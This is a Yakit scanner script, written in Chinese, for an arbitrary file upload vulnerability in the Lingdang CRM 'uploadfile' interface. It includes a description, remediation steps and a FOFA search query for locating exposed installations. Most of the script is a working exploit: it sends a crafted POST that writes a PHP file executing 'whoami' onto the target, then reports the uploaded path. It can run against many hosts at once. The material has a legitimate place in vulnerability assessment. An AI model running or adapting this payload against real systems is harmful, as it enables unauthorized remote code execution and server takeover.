script_name: 灵当CRM-接口uploadfile文件上传漏洞
content:
yakit.AutoInitYakit()

# Input your code!

info = `灵当CRM系统接口uploadfile文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

https://wiki.wy876.cn/#/./灵当CRM/灵当CRM系统接口uploadfile文件上传漏洞
`
solution = `1.对上传接口做访问控制
2.将保存上传文件的目录设置为不解析`

def Check(addr) {
    packet = `POST /crm/weixinmp/index.php?userid=123&module=Upload&usid=1&action=uploadfile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Connection: close

file_info={"name":"1.php"}&<?php system("whoami");unlink(__FILE__);?>
`

    is_https = str.IsTLSServer(addr)

    rsp, req = poc.HTTP(packet, poc.replaceHost(addr), poc.https(is_https), poc.connectTimeout(5))~

    rsp1 = poc.ParseBytesToHTTPResponse(rsp)~

    println("---------------------")
    body = string(rsp1.Body).ReplaceAll("{{", "{").ReplaceAll("}}", "}")

    body_json = json.loads(body)

    if body_json["code"] == 1 && rsp1.StatusCode == 200 {
        path = body_json["result"]["list"]["filepath"]
        name = body_json["result"]["list"]["filename"]
        filepath = f`${addr}/crm/${path}${name}`
        yakit.Info(filepath)
        #漏洞写入数据库
        if str.Contains(name, "php") {
            risk.NewRisk(
                string(addr), 
                risk.severity("high"), 
                risk.title(string(addr) + "存在uploadfile文件上传漏洞"), 
                risk.description(info), 
                risk.solution(solution), 
                risk.request(string(req)), 
                risk.response(string(rsp)), 
                risk.type("file-upload"),
                risk.details({"路径": string(filepath)}), 
            )
        } else {
            risk.NewRisk(
                string(addr), 
                risk.severity("warning"), 
                risk.title(string(addr) + "存在灵当CRM-uploadfile文件上传漏洞"), 
                risk.description(info + `注:PHP后缀可能被过滤`), 
                risk.solution(solution), 
                risk.request(string(req)), 
                risk.response(string(rsp)), 
                risk.type("file-upload"),
                risk.details({"路径": string(filepath)}), 
            )
        }
    }
}

target = cli.Text("target", cli.setHelp("填写url或host,一行一个"), cli.setRequired(true))
cli.check()
targets = str.ParseStringToLines(target)
wg := sync.NewSizedWaitGroup(50)
for target in targets {
    yakit.Info(f"正在测试 ${target}")
    ip, port, _ = str.ParseStringToHostPort(target)
    addr = str.HostPort(ip, port)
    if port==0{
        addr=ip
    }
    wg.Add(1)
    go func() {
        defer wg.Done()
        Check(addr)
    }()
}
wg.Wait()
help: 灵当CRM uploadfil接口处存在任意文件写入漏洞，攻击者可通过该漏洞在上传任意文件至服务器上从而实现远程接管。fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
